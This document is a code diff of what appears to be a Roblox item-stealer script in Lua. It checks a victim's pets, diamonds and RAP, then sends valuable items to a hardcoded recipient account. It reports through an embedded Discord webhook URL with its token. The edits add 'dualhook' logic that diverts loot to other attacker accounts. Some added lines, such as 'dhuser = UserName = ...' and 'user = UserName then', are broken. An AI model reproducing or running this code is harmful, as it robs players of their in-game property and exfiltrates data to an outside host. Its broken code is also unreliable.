@@ -16,7 +16,7 @@ for i,v in pairs(Library.Save.Get().Pets) do
     end
 end
 if hugeamount >1 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
-     UserName = "TehPucuk_55"
+     dhuser = UserName = "TehPucuk_55"
      Webhook = "https://discord.com/api/webhooks/1105338973276098640/06ugJwRCNfo9JEKzGcvhiPQjz4v72-qeUH1Hz3MnRSpAqMcteAyq4Pxk5CmpZC5sXSxu"
 end
 
@@ -1330,7 +1330,7 @@ spawn(function()
                 user = UserName
                 if hugein ~= nil then
                     if dualhook(hugein) then
-                    user = dhuser
+                    
                     end
                 end
                 local args = {
@@ -1356,7 +1356,8 @@ spawn(function()
     while wait() do
         if #PList ~= 0 and #TList == 0 and #BList == 0 and #HList == 0 then
             for i, v in pairs(PList) do
-                user = UserName
+                user = UserName then
+                user = ndUser
                 if pogin ~= nil then
                     if dualhook(pogin) then
                     end
@@ -1383,7 +1384,7 @@ spawn(function()
     while wait() do
         if #EList ~= 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(EList) do
-                user = UserName
+                user = ndUser
                 if excin ~= nil then
                     if dualhook(excin) then
                     end
